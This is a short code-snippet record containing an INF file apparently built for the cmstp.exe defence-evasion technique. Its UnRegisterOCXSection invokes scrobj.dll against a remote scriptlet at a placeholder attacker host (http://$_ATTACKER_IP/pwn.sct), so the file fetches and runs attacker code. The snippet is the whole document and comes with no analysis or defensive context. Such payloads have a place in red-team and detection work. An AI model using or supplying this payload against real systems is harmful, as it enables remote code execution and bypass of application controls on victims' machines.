---
id: 166eecc7-406f-4740-ae50-693e5970f7c5
type: code
language: INF File
verified: false
created_at: '2020-03-16T21:54:16.619580+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 166eecc7

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```
